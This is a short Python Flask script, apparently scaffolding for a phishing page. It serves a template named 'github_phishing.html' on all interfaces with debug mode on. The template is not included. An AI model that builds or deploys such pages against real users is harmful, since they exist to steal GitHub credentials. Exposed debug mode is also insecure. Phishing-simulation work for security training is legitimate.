from flask import Flask, render_template, request, jsonify, redirect, url_for, session
import requests
import re
import random
import time
import os

# 获取当前模块所在目录，用于定位 templates
_MODULE_DIR = os.path.dirname(os.path.abspath(__file__))
_TEMPLATES_DIR = os.path.join(_MODULE_DIR, "templates")

app = Flask(__name__, template_folder=_TEMPLATES_DIR)


''''''
@app.route("/")
def index():
    return render_template("github_phishing.html")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=6003, debug=True)